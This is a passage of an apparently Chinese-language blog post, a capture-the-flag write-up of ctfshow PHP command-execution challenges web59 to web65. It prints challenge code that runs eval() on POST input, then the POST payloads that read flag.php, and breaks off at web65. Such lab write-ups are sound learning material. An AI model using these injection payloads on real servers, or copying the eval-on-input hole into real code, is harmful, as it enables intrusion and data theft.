@@ -1,0 +1,440 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>CTF-ctfshow_Web入门_命令执行4 | SereniusX的博客</title><meta name="author" content="SereniusX"><meta name="copyright" content="SereniusX"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="题目来源：CTFshow 练习时间：2026年2月9日 练习数量：10 上篇博客链接：CTF-ctfshow_Web入门_命令执行3 ⭐️ 31 web59🚩flag：ctfshow{68862ff0-59ce-4fd3-8025-deba7c1de8de} 💡hint：Web 命令执行（Command Injection） 过滤绕过 题目： &lt;?php&#x2F;*# -*- coding: u">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF-ctfshow_Web入门_命令执行4">
+<meta property="og:url" content="https://sereniusx.github.io/2026/02/09/CTF-ctfshow_Web%E5%85%A5%E9%97%A8_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C4/index.html">
+<meta property="og:site_name" content="SereniusX的博客">
+<meta property="og:description" content="题目来源：CTFshow 练习时间：2026年2月9日 练习数量：10 上篇博客链接：CTF-ctfshow_Web入门_命令执行3 ⭐️ 31 web59🚩flag：ctfshow{68862ff0-59ce-4fd3-8025-deba7c1de8de} 💡hint：Web 命令执行（Command Injection） 过滤绕过 题目： &lt;?php&#x2F;*# -*- coding: u">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://sereniusx.github.io/img/avatar2.jpg">
+<meta property="article:published_time" content="2026-02-09T10:46:46.000Z">
+<meta property="article:modified_time" content="2026-02-09T11:46:34.696Z">
+<meta property="article:author" content="SereniusX">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://sereniusx.github.io/img/avatar2.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "CTF-ctfshow_Web入门_命令执行4",
+  "url": "https://sereniusx.github.io/2026/02/09/CTF-ctfshow_Web%E5%85%A5%E9%97%A8_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C4/",
+  "image": "https://sereniusx.github.io/img/avatar2.jpg",
+  "datePublished": "2026-02-09T10:46:46.000Z",
+  "dateModified": "2026-02-09T11:46:34.696Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "SereniusX",
+      "url": "https://sereniusx.github.io/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon2.ico"><link rel="canonical" href="https://sereniusx.github.io/2026/02/09/CTF-ctfshow_Web%E5%85%A5%E9%97%A8_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C4/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'undefined')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'undefined')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'CTF-ctfshow_Web入门_命令执行4',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/shuoshuo.css"><link rel="stylesheet" href="/css/gpt-article.css"><link rel="stylesheet" href="/css/custom.css"><link rel="stylesheet" href="/css/heatmap.css"><meta name="generator" content="Hexo 7.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar2.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">29</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li><li><a class="site-page child" href="/heatmap/"><i class="fa-fw fa fa-fire"></i><span> 热力图</span></a></li><li><a class="site-page child" href="/writer/"><i class="fa-fw fa fa-print"></i><span> 编辑器</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuos/"><i class="fa-fw fa fa-heart"></i><span> 说说</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/books/"><i class="fa-fw fas fa-book"></i><span> 书单</span></a></li><li><a class="site-page child" href="/useful/"><i class="fa-fw fas fa-tags"></i><span> 常用</span></a></li><li><a class="site-page child" href="/achievements/"><i class="fa-fw fa fa-medal"></i><span> 成就</span></a></li><li><a class="site-page child" href="/todo/"><i class="fa-fw fa fa-list-check"></i><span> 待办</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/mylink/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">SereniusX的博客</span></a><a class="nav-page-title" href="/"><span class="site-name">CTF-ctfshow_Web入门_命令执行4</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li><li><a class="site-page child" href="/heatmap/"><i class="fa-fw fa fa-fire"></i><span> 热力图</span></a></li><li><a class="site-page child" href="/writer/"><i class="fa-fw fa fa-print"></i><span> 编辑器</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuos/"><i class="fa-fw fa fa-heart"></i><span> 说说</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/books/"><i class="fa-fw fas fa-book"></i><span> 书单</span></a></li><li><a class="site-page child" href="/useful/"><i class="fa-fw fas fa-tags"></i><span> 常用</span></a></li><li><a class="site-page child" href="/achievements/"><i class="fa-fw fa fa-medal"></i><span> 成就</span></a></li><li><a class="site-page child" href="/todo/"><i class="fa-fw fa fa-list-check"></i><span> 待办</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/mylink/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">CTF-ctfshow_Web入门_命令执行4</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-02-09T10:46:46.000Z" title="发表于 2026-02-09 18:46:46">2026-02-09</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-02-09T11:46:34.696Z" title="更新于 2026-02-09 19:46:34">2026-02-09</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div><article class="container post-content" id="article-container"><p><em>题目来源：<a target="_blank" rel="noopener" href="https://ctf.show/challenges">CTFshow</a></em></p>
+<p><em>练习时间：2026年2月9日</em></p>
+<p><em>练习数量：10</em></p>
+<p>上篇博客链接：<br><a href="https://sereniusx.github.io/2026/02/08/CTF-ctfshow_Web%E5%85%A5%E9%97%A8_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C3/">CTF-ctfshow_Web入门_命令执行3</a></p>
+<h2 id="⭐️-31-web59"><a href="#⭐️-31-web59" class="headerlink" title="⭐️ 31 web59"></a>⭐️ 31 web59</h2><p>🚩flag：<code>ctfshow{68862ff0-59ce-4fd3-8025-deba7c1de8de}</code></p>
+<p>💡hint：<code>Web 命令执行（Command Injection）</code> <code>过滤绕过</code></p>
+<p>题目：</p>
+<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Lazzaro</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">'c'</span>])){</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">'c'</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>同上题：</p>
+<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">670</span>b79e1-<span class="number">5123</span>-<span class="number">49</span>d3-<span class="number">9</span>ddb-<span class="number">147</span>ebdab84dc.challenge.ctf.show</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: <span class="number">30</span></span><br><span class="line"></span><br><span class="line">c=<span class="title function_ invoke__">highlight_file</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<hr>
+<h2 id="⭐️-32-web60"><a href="#⭐️-32-web60" class="headerlink" title="⭐️ 32 web60"></a>⭐️ 32 web60</h2><p>🚩flag：<code>ctfshow{e7842818-6554-41e3-a0b8-5a7374694589}</code></p>
+<p>💡hint：<code>Web 命令执行（Command Injection）</code> <code>过滤绕过</code></p>
+<p>题目：</p>
+<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Lazzaro</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">'c'</span>])){</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">'c'</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>为什么是一样的题目呢。。</p>
+<p>同上题：</p>
+<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">307815</span>ed-<span class="number">8e14</span>-<span class="number">4</span>a52-<span class="number">9</span>c4e-<span class="number">2e22</span>ee0df4ac.challenge.ctf.show</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: <span class="number">30</span></span><br><span class="line"></span><br><span class="line">c=<span class="title function_ invoke__">highlight_file</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<hr>
+<h2 id="⭐️-33-web61"><a href="#⭐️-33-web61" class="headerlink" title="⭐️ 33 web61"></a>⭐️ 33 web61</h2><p>🚩flag：<code>ctfshow{63bc8060-b842-4647-ad0f-a5df78ffda3f}</code></p>
+<p>💡hint：<code>Web 命令执行（Command Injection）</code> <code>过滤绕过</code></p>
+<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Lazzaro</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">'c'</span>])){</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">'c'</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>为什么还是一样的题目呢。。</p>
+<p>同上题：</p>
+<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: d6c9cfca-<span class="number">4090</span>-<span class="number">43</span>ff-b2ff-<span class="number">9</span>f9ded19a20a.challenge.ctf.show</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: <span class="number">30</span></span><br><span class="line"></span><br><span class="line">c=<span class="title function_ invoke__">highlight_file</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<hr>
+<h2 id="⭐️-14-web62"><a href="#⭐️-14-web62" class="headerlink" title="⭐️ 14 web62"></a>⭐️ 14 web62</h2><p>🚩flag：<code>ctfshow{3d9a3d94-8773-46d5-b07a-01ce93db4ea6}</code></p>
+<p>💡hint：<code>Web 命令执行（Command Injection）</code> <code>过滤绕过</code></p>
+<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Lazzaro</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">'c'</span>])){</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">'c'</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>还还还是一样 没招了</p>
+<p>同上题：</p>
+<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">5</span>b61b9c7-<span class="number">0</span>ee7-<span class="number">469</span>b-<span class="number">88</span>f2-<span class="number">5e077</span>b9510d4.challenge.ctf.show</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: <span class="number">30</span></span><br><span class="line"></span><br><span class="line">c=<span class="title function_ invoke__">highlight_file</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<hr>
+<h2 id="⭐️-35-web63"><a href="#⭐️-35-web63" class="headerlink" title="⭐️ 35 web63"></a>⭐️ 35 web63</h2><p>🚩flag：<code>ctfshow{7dc51247-8dc6-4a60-9460-62ba0124f1bd}</code></p>
+<p>💡hint：<code>Web 命令执行（Command Injection）</code> <code>过滤绕过</code></p>
+<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Lazzaro</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">'c'</span>])){</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">'c'</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<p>还还还是一样 没招了</p>
+<p>同上题：</p>
+<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">0e5680</span>e6-<span class="number">6901</span>-<span class="number">4</span>d35-<span class="number">86</span>f9-<span class="number">0</span>f04abd20120.challenge.ctf.show</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: <span class="number">30</span></span><br><span class="line"></span><br><span class="line">c=<span class="title function_ invoke__">highlight_file</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<hr>
+<h2 id="⭐️-36-web64"><a href="#⭐️-36-web64" class="headerlink" title="⭐️ 36 web64"></a>⭐️ 36 web64</h2><p>🚩flag：<code>ctfshow{0e297d1c-37ad-4482-8da1-dadfc684c479}</code></p>
+<p>💡hint：<code>Web 命令执行（Command Injection）</code> <code>过滤绕过</code></p>
+<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Lazzaro</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">'c'</span>])){</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">'c'</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+
+<p>还还还是一样 没招了</p>
+<p>同上题：</p>
+<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: fbfe0ed6-<span class="number">8461</span>-<span class="number">4</span>b54-ab94-<span class="number">942</span>a92dfe351.challenge.ctf.show</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: <span class="number">30</span></span><br><span class="line"></span><br><span class="line">c=<span class="title function_ invoke__">highlight_file</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+
+<hr>
+<h2 id="⭐️-37-web65"><a href="#⭐️-37-web65" class="headerlink" title="⭐️ 37 web65"></a>⭐️ 37 web65</h2><p>🚩flag：<code>ctfshow{39243ef1-5c4d-4876-b854-a15484bde24c}</code></p>
+<p>💡hint：<code>Web 命令执行（Command Injection）</code> <code>过滤绕过</code></p>
